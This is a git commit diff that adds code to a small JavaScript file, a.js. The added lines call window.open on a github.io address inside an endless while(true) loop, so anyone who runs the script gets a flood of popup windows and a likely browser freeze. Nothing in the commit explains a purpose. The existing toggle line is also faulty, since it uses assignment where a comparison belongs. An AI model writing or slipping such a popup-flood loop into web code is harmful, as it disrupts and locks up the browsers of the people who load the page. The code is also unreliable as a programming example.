ae9a4d8061dd2fa7a36266784c4f8ba66377d397
sounobbao <48261004+sounobbao@users.noreply.github.com>
2023-02-20 09:42:42 +0000

    Add files via upload

--- a.js
+++ a.js
@@ -2,4 +2,9 @@ w = 0;
 while (true) {
     w=0 ? w=1 : w=0
     console.log(w)
+    window.open("https://sounobbao.github.io")
+}
+
+function a() {
+    return window.open("https://sounobbao.github.io")
 }
